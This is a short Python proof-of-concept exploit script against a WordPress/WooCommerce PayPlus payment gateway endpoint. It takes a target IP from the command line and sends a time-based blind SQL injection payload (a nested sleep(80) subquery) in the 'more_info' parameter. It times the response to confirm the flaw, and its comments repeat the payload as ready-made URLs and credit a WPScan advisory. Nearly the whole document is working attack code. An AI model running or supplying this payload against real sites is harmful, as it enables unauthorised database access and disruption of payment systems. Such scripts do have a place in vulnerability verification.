import requests
import sys
import time

# Ensure the user provides the IP address as a command-line argument
if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <IP_ADDRESS>")
    sys.exit(1)

# Extract the IP address from command-line arguments
ip = sys.argv[1]

# Construct the base URL using the provided IP address

base_url = f"http://{ip}/"

# Parameters for the SQL injection attempt

params = {
    "wc-api": "payplus_gateway",
    "status_code": "true",
    "more_info": "(select * from (select(sleep(80)))a)"
}

print("Response crafted and sent")
start_time = time.time()
# Send the request
response = requests.get(base_url, params=params)
end_time = time.time()
time_difference = end_time - start_time
print(f"Time taken for the request: {time_difference:.2f} seconds")
print("Courtesy to WPScan for Proof of Concept: https://wpscan.com/vulnerability/7e2c5032-2917-418c-aee3-092bdb78a087/")
print(response.text)


# Proof of Concept https://test.site/?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(2)))a)
# Local test http://localhost/?wc-api=payplus_gateway&status_code=true&more_info=(select*from(select(sleep(5)))a)
